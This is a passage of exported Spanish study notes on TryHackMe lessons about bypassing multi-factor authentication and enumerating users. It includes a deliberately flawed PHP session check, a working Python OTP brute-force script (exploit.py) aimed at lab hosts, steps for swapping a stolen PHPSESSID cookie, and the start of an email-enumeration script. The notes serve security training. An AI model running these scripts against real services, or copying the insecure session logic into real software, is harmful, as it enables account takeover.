    "content": "<h2>¬øError de L√≥gica o Programaci√≥n Insegura?</h2>\nEn algunas aplicaciones, los fallos de l√≥gica o pr√°cticas de programaci√≥n insegura pueden conducir a una situaci√≥n donde las partes cr√≠ticas de la aplicaci√≥n pueden ser accedidas sin completar de forma total el proceso de autentificaci√≥n. Espec√≠ficamente, un atacante puede ser capaz de bypassear los mecanismos 2FA de forma total y ganar acceso a √°reas sensibles del usuario sin introducir la OTP. Esto suele deberse a manejo de sesiones inadecuado, controles de acceso pobres o implementaci√≥n de l√≥gica que no consigue reforzar el requerimiento 2FA.\n\n----------------------------------------\n<h2>Explotaci√≥n</h2>\nVamos a http://mfa.thm/labs/second/ y nos registramos con las mismas credenciales que antes.\n\n![[Pasted image 20251225212016.png]]\n\nT√≠picamente, el atacante necesita entender c√≥mo el login y el proceso 2FA de la aplicaci√≥n funcionan. En este caso, despu√©s de introducir las credenciales, al usuario se le pide que introduzca un OTP.\n\n![[Pasted image 20251225212122.png]]\n\nEn lugar de introducir el OTP, el atacante puede intentar manipular la URL o bypassear el paso OTP todo junto. Por ejemplo, el atacante puede buscar acceder directamente a la URL del dashboard (`http://mfa.thm/labs/second/dashboard`) sin completar los pasos de autentificaci√≥n requeridos.\n\nSi la aplicaci√≥n no comprueba correctamente el estado de la sesi√≥n u obligaci√≥n de 2FA o la l√≥gica de la aplicaci√≥n es err√≥nea o d√©bil, el atacante puede ganar acceso al dashboard.\n\n![[Pasted image 20251225212343.png]]\n\n----------------------------------------\n<h2>Profundizando en el C√≥digo</h2>\nEl c√≥digo de abajo es parte del c√≥digo usado en la p√°gina `/mfa`. Como puedes ver, el `$_SESSION['authenticated']` es emitido despu√©s de completar el proceso 2FA.\n\n```php\n# Function that verifies the submitted 2FA token\nfunction verify_2fa_code($code) {\n    if (!isset($_SESSION['token']))\n    return false;\n\n    return $code === $_SESSION['token'];\n}\n\n# Function called in the /mfa page\nif (verify_2fa_code($_POST['code'])) { #If successful, the user will be redirected to the dashboard.\n    $_SESSION['authenticated'] = true; # Session that is used to check if the user completed the 2FA\n    header('Location: ' . ROOT_DIR . '/dashboard');\n    return;\n}\n```\n\nConsiderando que la implementaci√≥n de arriba es segura, algunas instancias de emisi√≥n de `$_SESSION['authenticated']` despu√©s del primer paso de autentificaci√≥n, omitir√°n el c√≥digo anterior como se muestra a continuaci√≥n.\n\n```php\nfunction authenticate($email, $password){\n  $pdo = get_db_connection();\n  $stmt = $pdo->prepare(\"SELECT `password` FROM users WHERE email = :email\");\n  $stmt->execute(['email' => $email]);\n  $user = $stmt->fetch(PDO::FETCH_ASSOC);\n\n  return $user && password_verify($password, $user['password']);\n}\n\nif (authenticate($email, $password)) {\n    $_SESSION['authenticated'] = true; # This flag should only be issued after the MFA completion\n    $_SESSION['email'] = $_POST['email'];\n    header('Location: ' . ROOT_DIR . '/mfa');\n    return;\n}\n```\n\nComo el dashboard de la aplicaci√≥n s√≥lo comprueba el valor de `$_SESSION['authenticated']`, sin importar si es true o false, el atacante puede sobrepasarlo f√°cilmente considerando que tiene conocimiento previo de los endpoints de la aplicaci√≥n.\n\nPara remediar esto podr√≠a partirse la cookie en dos, usando la primera parte para verificar las credenciales correctas y la segunda para el 2FA.",
    "modified": "2025-12-26T00:53:51"
  },
  {
    "title": "6. Practical Beating the Auto-Logout Feature",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/5-multi-factor-authentication/6-practical-beating-the-auto-logout-feature/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/5. Multi-Factor Authentication/6. Practical Beating the Auto-Logout Feature.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 5. Multi-Factor Authentication",
    "content": "En algunas aplicaciones, fallar el reto 2FA puede causar que la aplicaci√≥n revierta al usuario de vuelta a la primera parte de autentificaci√≥n del proceso. Este comportamiento ocurre normalmente debido a medidas de seguridad para prevenir la fuerza bruta.\n\n-------------------------------------\n<h2>Razones Comunes para este Comportamiento</h2>\n<h4>Invalidaci√≥n de Sesi√≥n</h4>\nSi fallas la autentificaci√≥n 2FA, la aplicaci√≥n puede que invalide la sesi√≥n del usuario como medida de seguridad, forzando al usuario a que comience de nuevo el proceso de autentificaci√≥n.\n<h4>Limitaci√≥n de Frecuencia y Pol√≠ticas de Bloqueo</h4>\nPara prevenir que los atacantes intenten bypassear el 2FA repetidamente, la aplicaci√≥n puede tener un l√≠mite de frecuencia o mecanismos de bloqueo que se disparan despu√©s de un n√∫mero de intentos fallidos.\n<h4>Redirecci√≥n por Seguridad</h4>\nAlgunas aplicaciones est√°n dise√±adas para redirigir a los usuarios de vuelta a la p√°gina de login despu√©s de un n√∫mero de intentos fallidos, revirtiendo al usuario al paso inicial.\n\n-------------------------------------\n<h2>La Automatizaci√≥n es Clave</h2>\nLa automatizaci√≥n hace la vida m√°s f√°cil al atacar estos tipos de protecci√≥n porque:\n\n<h4>Rapidez</h4>\nIniciar sesi√≥n manualmente cada vez que te cierran la sesi√≥n es lento y tedioso. La automatizaci√≥n lo puede hacer mucho m√°s r√°pido.\n<h4>Consistencia</h4>\nLa automatizaci√≥n evita errores que pueden pasar si est√°s haciendo acciones repetitivas una y otra vez. Es confiable.\n<h4>Recuperarse de los Cierres de Sesi√≥n</h4>\nSi la aplicaci√≥n te cierra la sesi√≥n despu√©s de unos cuantos intentos fallidos, el script puede iniciar sesi√≥n de vuelta y seguir intent√°ndolo. Esto ahorra el proceso de tener que hacerlo manualmente cada vez.\n<h4>Personalizaci√≥n</h4>\nCrear un script de automatizaci√≥n manualmente para el ataque ofrece m√°s flexibilidad que usar una √∫nica herramienta como ZAP o Burp Suite. Puedes personalizar tus scripts para comprobar escenarios espec√≠ficos como usar diferentes IPs o user-agents o variar  los tiempos entre peticiones.\n\n--------------------------------\n<h2>Explotaci√≥n</h2>\nLa aplicaci√≥n hosteada en http://mfs.thm/labs/third cierra la sesi√≥n del usuario autom√°ticamente si falla el 2FA. Con prop√≥sito de demostraci√≥n, la aplicaci√≥n tambi√©n genera un PIN de 4 d√≠gitos cada vez que el usuario inicia sesi√≥n en la aplicaci√≥n.\n\n>[!NOTE] En una aplicaci√≥n real el PIN suele fluctuar entre 0000 y 9999 (si tiene 4 d√≠gitos), pero por el prop√≥sito de la tarea est√° reducido.\n\n```php\nfunction generateToken()\n{\n    $token = strval(rand(1250, 1350));\n\n    $_SESSION['token'] = $token;\n    return 'success';\n}\n```\n\nUsando el siguiente script, gu√°rdalo como **exploit.py** y ejec√∫talo en tu terminal:\n\n```python\nimport requests\n\n# Define the URLs for the login, 2FA process, and dashboard\nlogin_url = 'http://mfa.thm/labs/third/'\notp_url = 'http://mfa.thm/labs/third/mfa'\ndashboard_url = 'http://mfa.thm/labs/third/dashboard'\n\n# Define login credentials\ncredentials = {\n    'email': 'thm@mail.thm',\n    'password': 'test123'\n}\n\n# Define the headers to mimic a real browser\nheaders = {\n    'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',\n    'Accept-Language': 'en-US,en;q=0.5',\n    'Accept-Encoding': 'gzip, deflate',\n    'Content-Type': 'application/x-www-form-urlencoded',\n    'Origin': 'http://mfa.thm',\n    'Connection': 'close',\n    'Referer': 'http://mfa.thm/labs/third/mfa',\n    'Upgrade-Insecure-Requests': '1'\n}\n\n# Function to check if the response contains the login page\ndef is_login_successful(response):\n    return \"User Verification\" in response.text and response.status_code == 200\n\n# Function to handle the login process\ndef login(session):\n    response = session.post(login_url, data=credentials, headers=headers)\n    return response\n  \n# Function to handle the 2FA process\ndef submit_otp(session, otp):\n    # Split the OTP into individual digits\n    otp_data = {\n        'code-1': otp[0],\n        'code-2': otp[1],\n        'code-3': otp[2],\n        'code-4': otp[3]\n    }\n    \n    response = session.post(otp_url, data=otp_data, headers=headers, allow_redirects=False)  # Disable auto redirects\n    print(f\"DEBUG: OTP submission response status code: {response.status_code}\")\n    \n    return response\n\n# Function to check if the response contains the login page\ndef is_login_page(response):\n    return \"Sign in to your account\" in response.text or \"Login\" in response.text\n\n# Function to attempt login and submit the hardcoded OTP until success\ndef try_until_success():\n    otp_str = '1337'  # Hardcoded OTP\n\n    while True:  # Keep trying until success\n        session = requests.Session()  # Create a new session object for each attempt\n        login_response = login(session)  # Log in before each OTP attempt\n        \n        if is_login_successful(login_response):\n            print(\"Logged in successfully.\")\n        else:\n            print(\"Failed to log in.\")\n            continue\n\n        print(f\"Trying OTP: {otp_str}\")\n\n        response = submit_otp(session, otp_str)\n\n        # Check if the response is the login page (unsuccessful OTP)\n        if is_login_page(response):\n            print(f\"Unsuccessful OTP attempt, redirected to login page. OTP: {otp_str}\")\n            continue  # Retry login and OTP submission\n\n        # Check if the response is a redirect (status code 302)\n        if response.status_code == 302:\n            location_header = response.headers.get('Location', '')\n            print(f\"Session cookies: {session.cookies.get_dict()}\")\n\n            # Check if it successfully bypassed 2FA and landed on the dashboard\n            if location_header == '/labs/third/dashboard':\n                print(f\"Successfully bypassed 2FA with OTP: {otp_str}\")\n                return session.cookies.get_dict()  # Return session cookies after successful bypass\n            elif location_header == '/labs/third/':\n                print(f\"Failed OTP attempt. Redirected to login. OTP: {otp_str}\")\n            else:\n                print(f\"Unexpected redirect location: {location_header}. OTP: {otp_str}\")\n        else:\n            print(f\"Received status code {response.status_code}. Retrying...\")\n\n# Start the attack to try until success\ntry_until_success()\n```\n\n<h4>Desglose del c√≥digo</h4>\n<h6>Preparaci√≥n del Script</h6>\n- **URLs:**\n\t- `login_url`: La URL de la p√°gina de inicio de sesi√≥n.\n\t- `otp_url`: La URL de la p√°gina donde se sube el PIN de 4 d√≠gitos.\n\t- `dashboard_url`: La URL de la p√°gina a la que se redirige al usuario despu√©s de un inicio de sesi√≥n exitoso.\n- **Credenciales:**\n\t- El diccionario `credentials` contiene los emails y contrase√±as que ser√°n usadas para iniciar sesi√≥n.\n- **Headers:** \n\t- El diccionario `headers` contiene los headers HTTP que imitan a una petici√≥n de navegador real, incluyendo `User-Agent`, `Referer`, `Content-Type` y m√°s.\n<h6>Funciones</h6>\n- `is_login_successful(response)`: Comprueba si el login fue exitoso buscando la frase \"User Verification\" en la respuesta y asegurando que el c√≥digo de estado es `200 OK`.\n- `login(session)`: Realiza el login mandando una petici√≥n POST con las credenciales del usuario a la `login_url`. Devuelve la respuesta del servidor.\n- `submit_otp(session,otp)`: Manda el PIN OTP de 4 d√≠gitos a `otp_url` como petici√≥n POST. El OTP se divide en d√≠gitos individuales y se mandan como par√°metros (`code-1`, `code-2`, etc.). Devuelve la respuesta del servidor.\n- `is_login_page(response)`: Comprueba si la respuesta contiene la p√°gina de login buscando palabras clave como \"Sign in to your account\" o \"Login\" en la respuesta.\n<h6>Proceso de Fuerza Bruta</h6>\n- **Rango OTP:** El script ciclar√° hasta que la aplicaci√≥n responda con el mismo OTP configurado en el script.\n- **Creaci√≥n de Sesi√≥n:** Para cada intento OTP, una nueva sesi√≥n es creada usando `requests.Session()`, asegurando una sesi√≥n nueva para cada login e intento de subida OTP.\n- **Intento de Login:** El script intenta iniciar sesi√≥n usando las credenciales ofrecidas. Si el login es exitoso, imprime \"Logged in successfully\" y contin√∫a con la subida OTP. Si el login falla, el script salta hasta el pr√≥ximo OTP.\n- **Subida OTP:** El formato del script OTP tiene una string de 4 d√≠gitos y la manda a `otp_url`.\n- **Manejo de Respuesta:**\n\t- Si la respuesta del servidor contiene la p√°gina de login, el script imprime un mensaje de error y contin√∫a con el siguiente OTP.\n\t- Si la respuesta tiene un c√≥digo de estado `302 Found`, comprueba el header `Location`:\n\t\t- Si es redirigido a `/labs/third/dashboard`, indica un bypass exitoso de OTP y el script imprime un mensaje de √©xito y sale.\n\t\t- Si es redirigido a `/labs/third`, indica OTP fallado y muestra un mensaje de error.\n\t\t- Cualquier otra direcci√≥n de redirecci√≥n se marca como inesperada\n\t- Si la respuesta tiene cualquier otro c√≥digo de estado, el script lo imprime y prueba el siguiente OTP.\n\nUna vez que el script tiene √©xito con la fuerza bruta, inicia sesi√≥n.\n\n![[Pasted image 20251226042333.png]]\n\nUsando la PHPSESSID que hemos obtenido, vamos a http://mfa.thm/labs/third, abrimos las herramientas de desarrollador y cambiamos el valor PHPSESSID en el apartado de \"Cookies\" en \"Storage\".\n\n![[Pasted image 20251226042459.png]]\n\nUna vez cambiado vamos a http://mfa.thm/labs/third/dashboard.\n\n![[Pasted image 20251226042607.png]]",
    "modified": "2025-12-27T00:52:04"
  },
  {
    "title": "1. How MFA Works",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/5-multi-factor-authentication/1-how-mfa-works/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/5. Multi-Factor Authentication/1. How MFA Works.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 5. Multi-Factor Authentication",
    "content": "En la era de la tecnolog√≠a, conservar nuestra informaci√≥n sensible y sistemas seguros es m√°s importante que nunca. La Autentificaci√≥n Multi Factor (MFA) a√±ade protecci√≥n extra para las cuentas de usuario requiriendo que ofrezcas dos o m√°s m√©todos de verificaci√≥n.\n\n>[!NOTE] 2FA es un subtipo de MFA.\n\n----------------------------------\n<h2>Tipos de Factores de Autentificaci√≥n</h2>\nMFA t√≠picamente combina dos o m√°s tipos de credenciales de las categor√≠as:\n\n- Algo que sabes.\n- Algo que tienes.\n- Algo que eres.\n- Alg√∫n sitio donde est√°s.\n- Algo que haces.\n\n![[Pasted image 20251223201529.png]]\n\n<h4>Algo que Sabes</h4>\nPodr√≠a ser una contrase√±a, PIN o cualquier otra pieza de informaci√≥n que tengas que recordar. Forma la base de la mayor√≠a de sistemas de autentificaci√≥n pero puede ser vulnerable usada individualmente.\n<h4>Algo que Tienes</h4>\nPodr√≠a ser tu tel√©fono con una aplicaci√≥n de autentificaci√≥n, un token de seguridad o incluso una tarjeta. √öltimamente se est√°n viendo m√°s certificados de clientes, que son como IDs digitales para dispositivos.\n<h4>Algo que Eres</h4>\nInvolucra las medidas biom√©tricas, como huellas, reconocimiento facial o de iris. Est√° ganando popularidad porque es dif√≠cil falsificarla. \n<h4>Alg√∫n Sitio en el que Est√°s</h4>\nInvolucra tu direcci√≥n IP de origen o geolocalizaci√≥n. Algunas aplicaciones como la banca online, restringen la actividad si detectan que est√°s haciendo la petici√≥n desde una direcci√≥n IP desconocida.\n<h4>Algo que Haces</h4>\nEs normalmente usada en aplicaciones que restringen la interacci√≥n de bots, como p√°ginas de registro. La app analiza la forma en la que el usuario introduce credenciales o mueve su rat√≥n.\n\n----------------------------------------------\n<h2>Tipos de 2FA</h2>\n2FA requiere exactamente 2 tipos de los anteriores, por lo que todo 2FA es un MFA pero no cualquier MFA es un 2FA. Algunos de los m√©todos m√°s comunes incluyen:\n\n<h4>Time-Based One-Time Passwords</h4>\nSon contrase√±as temporales que cambian cada 30 segundos o as√≠. Aplicaciones como Google Authenticator, Microsoft Authenticator y Authy los usan, haci√©ndolo duro para los hackers de interceptar o reutilizar.\n<h4>Notificaciones Push</h4>\nAplicaciones como Duo o Google Prompt mandan una petici√≥n de inicio de sesi√≥n directamente a tu tel√©fono. Puedes aprobar o denegar el acceso correctamente desde tu dispositivo, a√±adiendo una capa de seguridad que verifica la posesi√≥n del dispositivo registrado.\n\nUn ataque sobre las notificaciones push (ataque de fatiga MFA) permiti√≥ a un atacante comprometer la cuenta de un empleado de Uber. Investiga m√°s sobre ello [aqu√≠](https://www.uber.com/newsroom/security-update).\n<h4>SMS</h4>\nLa mayor√≠a de aplicaciones actualmente usan este m√©todo. El sistema manda un mensaje con un c√≥digo de un solo uso al m√≥vil registrado del usuario. Aunque conveniente, es menos segura debido a vulnerabilidades asociadas con la intercepci√≥n de mensajes de texto.\n<h4>Tokens de Hardware</h4>\nDispositivos como las YubiKeys generan un c√≥digo de un uso o usan NFC para autentificarse. Son geniales porque no necesitan red o bater√≠a, por lo que generalmente funcionan offline.\n\n----------------------------------------\n<h2>Acceso Condicional</h2>\nEl acceso condicional es usado t√≠picamente por compa√±√≠as para ajustar sus requerimientos de autentificaci√≥n basado en diferentes contextos. Es como un √°rbol de decisiones que dispara medidas extra de seguridad dependiendo de ciertos factores.\n\n<h4>Basado en Localizaci√≥n</h4>\nSi un usuario inicia sesi√≥n desde su ubicaci√≥n actual, pude que s√≥lo tengan que aportar credenciales. Pero si inician sesi√≥n desde un litio nuevo o desconocido, el sistema podr√≠a pedir verificaci√≥n biom√©trica u OTP.\n<h4>Basado en Tiempo</h4>\nDurante las horas regulares de trabajo, los usuarios pueden entrar con sus credenciales, pero fuera de esas horas puede que se les pida una capa extra de seguridad como un OTP o token de seguridad.\n<h4>An√°lisis de Comportamiento</h4>\nSi el comportamiento de un usuario cambia abruptamente, el sistema puede pedir autentificaci√≥n adicional para confirmar que realmente es el usuario.\n<h4>Espec√≠fico de Dispositivo</h4>\nEn algunos casos, las compa√±√≠as no permiten a los empleados usar sus propios dispositivos para acceder a recursos de la compa√±√≠a. En estas situaciones, el sistema puede bloquear al usuario despu√©s del inicio de sesi√≥n si est√°n en un dispositivo no autorizado.\n\n-------------------------------------\n<h2>Adopci√≥n Global e Impulso Regulatorio</h2>\nLa adopci√≥n de MFA se est√° expandiendo r√°pidamente a lo largo de varios sectores debido a su efectividad en proteger contra varias amenazas de seguridad como phishing, ingenier√≠a social y ataques de contrase√±a.\n\nPor ejemplo, los gobiernos e industrias como la de la sanidad est√°n implementando MFA para cumplir con ciertas regulaciones como la GDPR en Europa, HIPAA en EE.UU. y PCI-DSS para sistemas de pago globales.",
    "modified": "2025-12-26T00:53:51"
  },
  {
    "title": "2. Implementations and Applications",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/5-multi-factor-authentication/2-implementations-and-applications/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/5. Multi-Factor Authentication/2. Implementations and Applications.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 5. Multi-Factor Authentication",
    "content": "MFA es hoy en d√≠a un factor importante para mantener nuestra actividad online y offline segura de los atacantes. Desde acciones bancarias o compa√±√≠as de salud hasta compa√±√≠as IT, estas recaen fuertemente en MFA para asegurar su informaci√≥n.\n\n--------------------------------------\n<h2>MFA en la Banca</h2>\nManejan informaci√≥n extremadamente sensible a diario. Usando MFA, los bancos protegen la informaci√≥n personal y financiera de sus usuarios.\n\nSuelen primero pedirte la contrase√±a (algo que t√∫ sabes) para poder pasar con la segunda verificaci√≥n (algo que t√∫ tienes) que puede ser un c√≥digo mandado a tu m√≥vil registrado.\n\n----------------------------------\n<h2>MFA en la Salud</h2>\nDebido a regulaciones como HIPAA en los Estados Unidos, MFA se asegura de que los registros m√©dicos de los pacientes sean s√≥lo accesibles por personas autorizadas.\n\nPor ejemplo, para acceder a los sistemas sensibles puede que se requiera una insignia del doctor (algo que t√∫ tienes) y adem√°s algo como la huella dactilar (algo que t√∫ eres).\n\n-----------------------------------------\n<h2>MFA en Compa√±√≠as IT</h2>\nCon el n√∫mero creciente de ciberataques y brechas de seguridad, los departamentos IT en el mundo corporativo est√°n bajo una intensa presi√≥n constante para proteger la informaci√≥n sensible del negocio y mantener la integridad de los sistemas. MFA ayuda a mitigar el riesgo de acceso no autorizado que podr√≠a llevar al robo de informaci√≥n, espionaje o sabotaje.",
    "modified": "2025-12-26T00:53:51"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/6-hammer/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/6. Hammer/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 6. Hammer",
    "content": "Para ver este curso ve a **THM -> Maquinas/2. Medium -> 6. Hammer -> 1. Getting the Flags**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Hammer",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/6-hammer/0-hammer/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/6. Hammer/0. Hammer.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 6. Hammer",
    "content": "[[Ciberseguridad/THM/Maquinas/2. Medium/6. Hammer/0. Hammer]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/6. Hammer/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Authentication Enumeration",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/1-enumeration-brute-force/2-authentication-enumeration/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/1. Enumeration & Brute Force/2. Authentication Enumeration.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 1. Enumeration & Brute Force",
    "content": "<h2>Enumeraci√≥n de Autentificaci√≥n</h2>\nPiensa en ti como un detective digital. No se trata s√≥lo de recoger pistas sino de entender lo que estas revelan sobre la seguridad del sistema. Esto es en esencia de lo que se trata la enumeraci√≥n de autentificaci√≥n.\n\nLa enumeraci√≥n de autentificaci√≥n es como pelar capas de una cebolla. Eliminas cada capa en busca del funcionamiento interno del sustema. No se trata de un escaneo rutinario, sino de ver c√≥mo todo conecta.\n\n<h4>Identificar Nombres de Usuario V√°lidos</h4>\nSaber nombres de usuario v√°lidos permite a un atacante centrarse en obtener la contrase√±a. Puedes adivinarlos de diferentes maneras, como observar c√≥mo la aplicaci√≥n responde durante el login o los reseteos de contrase√±a. Por ejemplo, mensajes de error que digan \"Esta cuenta no existe\" o \"Contrase√±a incorrecta\" pueden dar pistas a cerca de si la cuenta en cuesti√≥n existe.\n<h4>Pol√≠ticas de Contrase√±as</h4>\nLas normas al crear contrase√±as pueden ofrecer informaci√≥n valiosa sobre la complejidad de las contrase√±as usadas en una aplicaci√≥n. Entendiendo estas pol√≠ticas, un atacante puede medirla complejidad potencial de las contrase√±as y ajustar su estrategia.\n\nPor ejemplo el siguiente c√≥digo PHP usa regex para requerir que la contrase√±a incluya s√≠mbolos, n√∫meros y letras mat√∫sculas:\n\n```php\n<?php\n$password = $_POST['pass']; // Ejemplo1\n$pattern = '/^(?=.*[A-Z])(?=.*\\d)(?=.*[\\W_]).+$/';\n\nif (preg_match($pattern, $password)) {\n    echo \"Password is valid.\";\n} else {\n    echo \"Password is invalid. It must contain at least one uppercase letter, one number, and one symbol.\";\n}\n?>\n```\n\n--------------------------------------------------\n<h2>Sitios Comunes para Enumerar</h2>\nLas aplicaciones est√°n llenas de funcionalidades que hacen las cosas m√°s f√°ciles para los usuarios pero que tambi√©n pueden exponerlos a riesgos.\n<h4>P√°ginas de Registro</h4>\nLas aplicaciones web normalmente hacen que el registro de usuario sea directo e informativo indicando que el usuario escogido ya existe o no. Aunque esto est√° dise√±ado para mejorar la experiencia del usuario, puede tener un doble prop√≥sito para un atacante.\n<h4>Funcionalidades de Reseteo de Contrase√±as</h4>\nLos mecanismos de reseteo de contrase√±as est√°n dise√±ados para ayudar a los usuarios a ganar acceso a su cuenta de nuevo despu√©s de olvidar la contrase√±a. Sin embargo, las respuestas de la aplicaci√≥n pueden revelar informaci√≥n sensible.\n<h4>Verbosidad de Errores</h4>\nLos mensajes de error durante los intentos de inicio de sesi√≥n pueden revelar demasiado. Cuando estos mensajes se diferencian entre \"usuario no encontrado\" y \"contrase√±a incorrecta\", se intenta que los usuarios entiendan los errores del inicio de sesi√≥n. Sin embargo pueden ofecer pistas definitivas para los atacantes.\n<h4>Informaci√≥n de Brechas de Seguridad</h4>\nLa informaci√≥n de brechas de seguridad anteriores son una mina de oro para los atacantes ya que permiten testear su nombres de usuario y contrase√±as siguen siendo utilizados.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/1-enumeration-brute-force/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/1. Enumeration & Brute Force/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 1. Enumeration & Brute Force",
    "content": "La enumeraci√≥n de autentificaci√≥n es un aspecto fundamental del testeo de seguridad, concentr√°ndose espec√≠ficamente en los mecanismos que protegen aspectos sensibles de las aplicaciones web.\n\n----------------------------------\n<h2>Objetivos</h2>\n1. Entender el significado de enumeraci√≥n y configurar el entorno para ataques de fuerza bruta.\n2. Aprender m√©todos de enumeraci√≥n avanzados.\n3. Comprender la relaci√≥n entre enumeraci√≥n y ataques de fuerza bruta.\n4. Ganar experiencia usando herramientas para ambos tipos de t√©cnicas.\n\n-------------------------------\n<h2>Pre-requisitos</h2>\n1. Familiaridad con HTTP/HTTPS.\n2. Uso de Burp Suite.\n3. Uso de la CLI de Linux.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Enumerating Users via Verbose Errors",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/1-enumeration-brute-force/3-enumerating-users-via-verbose-errors/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/1. Enumeration & Brute Force/3. Enumerating Users via Verbose Errors.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 1. Enumeration & Brute Force",
    "content": "<h2>Entendiendo la Verbosidad de Errores</h2>\nImagina que eres un detective con un don para encontrar pistas que otros pasan por alto. En el mundo del desarrollo web, la verbosidad de errores son susurros inintencionados de un sistema, revelando secretos que deber√≠an estar esscondidos.\n\nLa verbosidad de errores puede revelar detalles como:\n\n- **Rutas Internas:** Como un mapa del tesoro, revelan la estructura de la aplicaci√≥n o servidor.\n- **Detalles de Bases de Datos:** Ofrece un vistazo a la base de datos.\n- **Informaci√≥n de Usuario:** A veces, estos errores pueden dar pistas sobre nombres de usuarios.\n\n-------------------------------\n<h2>Induciendo Verbosidad de Errores</h2>\nLos atacantes indicen errores como manera de forzar a la aplicaci√≥n a revelar sus secretos. Debajo, algunas de las t√©cnicas m√°s utilizadas:\n\n1. **Invalid Login Attempts:** Esto es como picar en todas las puertas para ver cu√°l se abre. Al introducir nombres err√≥neos de usuario o contrase√±as, los atacantes pueden disparar mensajes de errorque ayuden a distinguir entre nombres de usuario v√°lidos e inv√°lidos.\n2. **SQL Injection:** Esta t√©cnica implica inyectar c√≥digo SQL malicioso en cada campo, con la esperanza de que el sistema pete y mande mensajes de error que no deber√≠a.\n3. **File Inclusion/Path Traversal:** Manipulando rutas de archivos, los atacantes pueden intentar acceder a archivos restringidos llevando al sistema a errores que revelen rutas internas.\n4. **Form Manipulation:** Jugar con los campos de un formulario puede enga√±asr a la aplicaci√≥n para que muestre mensajes de error reveladores sobre el backend o la l√≥gica.\n5. **Application Fuzzing:** Mandar inputs no esperados a varias partes de la aplicaci√≥n, para ver c√≥mo reacciona, puede ayudar a identificar puntos d√©biles. Por ejemplo, herramientas como el Intruder de Burp Suite se usan para automatizar el proceso.\n\n----------------------------------\n<h2>El Rol de la Enumeraci√≥n y la Fuerza Bruta</h2>\nCuando se trata de violar la autentificaci√≥n, la enumeraci√≥n y la fuerza bruta suelen ir de la mano:\n\n- **Enumeraci√≥n de Usuarios:** Descubrir nombres de usuario v√°lidos configura el entorno, reduciendo el tiempo de adivinaci√≥on del ataque posterior de fuerza bruta.\n- **Exxplotar Verbosidad de Errores:** Los detalles encontrados gracias a estos errores pueden iluminar aspectos como las pol√≠ticas de contrase√±as y mecanismos de bloqueo de cuenta, allanando el camino de las estrategias de fuerza bruta.\n\nEn resumen, los errores de verbose son como migas de pan que llevan a los atacantes a partes profundas del sistema.\n\n------------------------------\n<h2>Enumeraci√≥n en Formularios de Autentificaci√≥n</h2>\nEn este [reporte](https://hackerone.com/reports/1166054) de HackerOne, este atacante fue capaz de enumerar usuarios usando la funci√≥n de \"Olvid√© mi Contrase√±a\" de la p√°gina.\n\nSi vas a la p√°gina ofrecida por esta unidad e introduces un correo no registrado obtendr√°s el siguiente mensaje:\n\n![[Pasted image 20251202132943.png]]\n\nSin embargo, si el correo est√° registrado, el sitio web responder√° con un mensaje de \"invalid Passwoord\", indicando que el email existe pero la contrase√±a es incorrecta.\n\n![[Pasted image 20251202133041.png]]\n\n--------------------------------------\n<h2>Automatizaci√≥n</h2>\nAqu√≠ debajo tienes un script de Python que comprobar√° emails v√°lidos en la p√°gina web objetivo.\n\n```python\nimport requests\nimport sys\n\ndef check_email(email):\n    url = 'http://enum.thm/labs/verbose_login/functions.php'  # Location of the login function\n    headers = {\n        'Host': 'enum.thm',\n        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',\n        'Accept': 'application/json, text/javascript, */*; q=0.01',\n        'Accept-Language': 'en-US,en;q=0.5',\n        'Accept-Encoding': 'gzip, deflate',\n        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',\n        'X-Requested-With': 